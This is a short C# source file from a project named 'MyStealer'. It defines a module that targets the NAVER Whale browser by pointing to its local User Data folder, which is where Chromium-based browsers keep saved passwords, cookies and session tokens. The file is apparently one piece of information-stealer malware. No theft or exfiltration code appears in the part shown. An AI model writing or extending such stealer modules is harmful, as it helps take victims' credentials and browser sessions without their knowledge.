using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class NaverWhale : Chromium
    {
        public override string ApplicationName => "NAVER Whale";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Naver", "Naver Whale", "User Data");
    }
}
